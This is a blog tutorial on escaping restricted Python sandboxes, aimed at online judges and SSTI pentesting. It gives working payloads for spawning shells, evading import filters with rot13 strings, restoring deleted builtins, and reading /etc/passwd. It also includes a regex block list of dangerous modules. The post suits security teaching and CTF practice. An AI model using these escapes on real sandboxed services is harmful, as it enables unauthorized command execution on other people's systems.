<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Computer, Network, Security">
    <meta name="description" content="a blog on Hexo">
    <meta name="author" content="TyeYeah">
    
    <title>
        
            Python Sandbox Escape |
        
        Relish the Moment
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/img/wang.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/logo.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               Relish the Moment
            </a>
        </div>

        <div class="right border-box">
            <div class="pc">
                <ul class="menu-list">
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                
                                HOME
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                
                                ARCHIVES
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                
                                TAGS
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                
                                CATEGORIES
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/"
                    >HOME</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives"
                    >ARCHIVES</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags"
                    >TAGS</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories"
                    >CATEGORIES</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about"
                    >ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        Python Sandbox Escape
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/img/aliwangwang.svg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">TyeYeah</span>
                                
                                    <span class="author-badge">Lv4</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2019-10-07 23:36:20</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Wed Feb 17 2021 10:22:02 GMT+0800">2021-02-17 10:22:02</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/Pwn/">Pwn</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/sandbox-escape/">sandbox-escape</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/python/">python</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>5.1k Words</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>32 Mins</span>
            </span>
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body">
                    

                    <p>In some OJ providing python sandbox, or web site written in python and using template rendering (<code>ssti</code> appears), your pentest must have something to do with python sandbox escape. </p>
<h2 id="Python2-Sandbox-Escape"><a href="#Python2-Sandbox-Escape" class="headerlink" title="Python2 Sandbox Escape"></a>Python2 Sandbox Escape</h2><p>When you are in a restricted python environment, to get rid of every limits and spawn a shell is the main target, but kind of tricky.<br>Our final aim is to get shell with the help of <code>os</code>,  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>eval</code>&#x2F;<code>exec</code>, </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>pty</code>, </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>subprocess</code>, </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call([<span class="string">&#x27;ifconfig&#x27;</span>],shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>commands</code>, </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line">commands.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>timeit</code>, </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>platform</code>, </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="built_in">print</span> platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>and other modules.</p>
<h3 id="import-Techniques"><a href="#import-Techniques" class="headerlink" title="import Techniques"></a><code>import</code> Techniques</h3><p>You may easily notice that most methods needs <code>import</code>, therefore importing libs is a good choice.</p>
<h4 id="Ways-to-Import"><a href="#Ways-to-Import" class="headerlink" title="Ways to Import"></a>Ways to Import</h4><p>As defenders will not make it easy, there should be filters and checks to prevent possible attacks.<br>The basic idea is to check code content, like</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = <span class="built_in">open</span>(<span class="string">&#x27;code.py&#x27;</span>).read()</span><br><span class="line">pattern  = re.<span class="built_in">compile</span>(<span class="string">&#x27;import\s+(os|commands|subprocess|sys)&#x27;</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;forbidden module import detected&quot;</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure>
<p>But we have other ways to <code>import</code></p>
<ul>
<li><code>import</code>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx`</span><br><span class="line"><span class="keyword">from</span> x <span class="keyword">import</span> xxx</span><br></pre></td></tr></table></figure></li>
<li><code>__import__</code>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><code>importlib</code>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib`</span><br><span class="line">f3ck = importlib.import_module(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>)</span><br><span class="line"><span class="comment"># bypass filters, decoded as &#x27;commands&#x27; </span></span><br><span class="line"><span class="built_in">print</span> f3ck.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="Ways-to-Reload"><a href="#Ways-to-Reload" class="headerlink" title="Ways to Reload"></a>Ways to Reload</h4>Builtin functions work with no need of <code>import</code>, because they are imported automatically along with <code>__builtin__</code> module being loaded.</li>
</ul>
<p>Then functions like <code>open()</code>, <code>int()</code> and <code>chr()</code> are equivalent to </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtin__.<span class="built_in">open</span>()</span><br><span class="line">__builtin__.<span class="built_in">int</span>()</span><br><span class="line">__builtin__.<span class="built_in">chr</span>()</span><br></pre></td></tr></table></figure>
<p>Therefore <code>eval()</code>, <code>exec()</code>, <code>execfile()</code> and  <code>__import__</code> can be executed in this way.<br>Other ways to operate</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> [entity <span class="keyword">for</span> entity <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__() <span class="keyword">if</span> entity.__name__ == <span class="string">&quot;file&quot;</span>][<span class="number">0</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;open&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;file&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;file&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dir</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;file&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dir</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;open&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">__import__</span>(<span class="string">&#x27;__builtin__&#x27;</span>).<span class="built_in">open</span>(<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">__import__</span>(<span class="string">&#x27;__builtin__&#x27;</span>).file(<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<p>So if we try to defend, delete them by using </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>] <span class="comment"># __import__ is the function called by the import statement</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] <span class="comment"># evaluating code could be dangerous</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>] <span class="comment"># likewise for executing the contents of a file</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>] <span class="comment"># Getting user input and evaluating it might be dangerous</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="keyword">del</span> __builtin__.<span class="built_in">chr</span></span><br></pre></td></tr></table></figure>

<p>It’s ok because we can recovery the complete module by </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtin__)</span><br></pre></td></tr></table></figure>
<p>While the truth is, <code>reload</code> is a method under <code>__builtin__</code>, so what if it is deleted already?</p>
<p>We have a module called <code>imp</code> to deal this</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure>
<p>Notice that a module can be reloaded only after it is imported.</p>
<h4 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h4><p>We import libs&#x2F;modules which are already in local file system, so why dont we remove them from disk firstly?<br>Question is where exactly are they?</p>
<p>Use <code>sys</code> to show <code>path</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line"> </span><br><span class="line">[<span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-tk&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-old&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-dynload&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages/gtk-2.0&#x27;</span>,</span><br><span class="line"> ...]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>It surely contains package directory of <code>pip</code> and <code>conda</code> and other related folders.</p>
<p>Show where a module is</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os		<span class="comment"># import first</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__file__		<span class="comment"># attribute xxx.__file__</span></span><br><span class="line"><span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Then look at <code>modules</code> under <code>sys</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;copy_reg&#x27;</span>: &lt;module <span class="string">&#x27;copy_reg&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/copy_reg.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;sre_compile&#x27;</span>: &lt;module <span class="string">&#x27;sre_compile&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_compile.pyc&#x27;</span>&gt;, </span><br><span class="line"> ...,</span><br><span class="line"> <span class="string">&#x27;os&#x27;</span>: &lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;, <span class="string">&#x27;_weakref&#x27;</span>: &lt;module <span class="string">&#x27;_weakref&#x27;</span> (built-<span class="keyword">in</span>)&gt;&#125;</span><br></pre></td></tr></table></figure>
<p>Change something to see what happens</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br></pre></td></tr></table></figure>
<p>So we guess, python import modules according to <code>sys.modules</code>, defenders can delete modules in this dict for protection.</p>
<p>What’s the deal? We do the reverse.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>

<h4 id="Ultimate"><a href="#Ultimate" class="headerlink" title="Ultimate"></a>Ultimate</h4><p>If <code>sys</code>, <code>os</code> and <code>reload</code> are banned, still a way to bypass?</p>
<p>Sure it is.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">bin</span>:x:<span class="number">2</span>:<span class="number">2</span>:<span class="built_in">bin</span>:/<span class="built_in">bin</span>:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">&#x27;/usr/lib/python2.7&#x27;</span></span><br></pre></td></tr></table></figure>
<p>If <code>execfile</code> is banned, use file i&#x2F;o operations to read, then use <code>exec</code> to execute codes. It suits python 3.x</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">exec</span>(f.read())</span><br><span class="line">system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>As a defender, delete the module file is the last strike.<br>Finally it’s hard to bypass, but the server may be fragile for lacking dependencies.</p>
<h3 id="Explore-Attrs-amp-Methods"><a href="#Explore-Attrs-amp-Methods" class="headerlink" title="Explore Attrs &amp; Methods"></a>Explore Attrs &amp; Methods</h3><p>use <code>dir()</code> method or <code>__dict__</code> attribute, to list all properties and functions under a specific module&#x2F;class&#x2F;object.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A.__dict__</span><br><span class="line">mappingproxy(&#123;<span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;asdas&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;, <span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;, <span class="string">&#x27;c&#x27;</span>: &lt;function A.c at <span class="number">0x7f18ea25e510</span>&gt;, <span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(A)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>They have differences, like <code>dir</code> suits every module, while <code>__dict__</code> may not exist in some.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__doc__)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__doc__.__dict__</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;__dict__&#x27;</span></span><br></pre></td></tr></table></figure>
